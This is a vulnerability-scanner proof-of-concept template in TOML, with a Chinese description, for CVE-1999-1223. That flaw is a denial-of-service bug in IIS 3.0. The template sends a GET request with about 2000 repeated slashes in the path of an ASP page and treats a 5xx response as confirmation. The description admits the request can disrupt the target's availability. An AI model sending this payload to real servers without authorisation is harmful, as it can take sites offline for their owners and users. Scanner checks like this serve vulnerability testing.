[info]
author = "ave"
description = "IIS 3.0 在处理包含大量连续正斜杠(/)字符的特制 ASP 请求时存在拒绝服务漏洞。本 PoC 通过向目标 ASP 页面发送一个 URL 路径中嵌入大量斜杠的请求，验证服务器是否因解析异常或资源耗尽而失去响应。无需认证，仅能造成目标站点可用性中断，属安全无损验证。"
id = "POC-AVE-1999-1012"
name = "CVE-1999-1223 (IIS 3.0 DoS) PoC"
severity = "medium"
tags = ["ave-1999-1012"]
vuln_id = [
    "CVE-1999-1223",
    "AVE-1999-1012",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = '/{{BaseURL}}/test.asp//////{{repeat("/", 2000)}}'
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [
    500,
    502,
    503,
    504,
]
type = "status"
